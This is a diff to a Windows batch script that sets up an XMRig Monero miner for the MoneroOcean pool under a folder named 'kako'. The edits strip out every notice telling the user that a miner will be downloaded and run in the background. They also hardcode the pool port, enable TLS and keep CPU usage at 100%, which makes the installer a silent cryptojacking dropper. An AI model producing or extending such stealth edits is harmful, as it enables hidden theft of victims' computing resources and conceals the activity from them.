@@ -4,10 +4,6 @@ set VERSION=2.4
 
 rem printing greetings
 
-echo Kako mining setup script v%VERSION%.
-echo ^(please report issues to support@moneroocean.stream email^)
-echo.
-
 net session >nul 2>&1
 if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)
 
@@ -20,8 +16,6 @@ rem checking prerequisites
 
 if [%WALLET%] == [] (
   echo Script usage:
-  echo ^> setup_moneroocean_miner.bat ^<wallet address^> [^<your email address^>]
-  echo ERROR: Please specify your wallet address
   exit /b 1
 )
 
@@ -29,7 +23,6 @@ for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a
 call :strlen "%WALLET_BASE%", WALLET_BASE_LEN
 if %WALLET_BASE_LEN% == 106 goto WALLET_LEN_OK
 if %WALLET_BASE_LEN% ==  95 goto WALLET_LEN_OK
-echo ERROR: Wrong wallet address length (should be 106 or 95): %WALLET_BASE_LEN%
 exit /b 1
 
 :WALLET_LEN_OK
@@ -165,9 +158,7 @@ rem printing intentions
 
 set "LOGFILE=%USERPROFILE%\kako\xmrig.log"
 
-echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
-echo If needed, miner in foreground can be started by %USERPROFILE%\kako\miner.bat script.
-echo Mining will happen to %WALLET% wallet.
+
 
 if not [%EMAIL%] == [] (
   echo ^(and %EMAIL% email as password to modify wallet options later at https://moneroocean.stream site^)
@@ -295,8 +286,12 @@ if not [%EMAIL%] == [] (
   set "PASS=%PASS%:%EMAIL%"
 )
 
-powershell -Command "$out = cat '%USERPROFILE%\kako\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.moneroocean.stream:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\kako\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\kako\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.moneroocean.stream:20128\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\kako\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\kako\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\kako\config.json'" 
+
+powershell -Command "$out = cat '%USERPROFILE%\kako\config.json' | %%{$_ -replace '\"tls\": *\".*\",', '\"tls\": \"true\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\kako\config.json'" 
+
+
 powershell -Command "$out = cat '%USERPROFILE%\kako\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\kako\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\kako\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\kako\config.json'" 
 set LOGFILE2=%LOGFILE:\=\\%
@@ -412,8 +407,3 @@ for /L %%A in (12,-1,0) do (
 )
 endlocal & set %~2=%len%
 exit /b
-
-
-
-
-
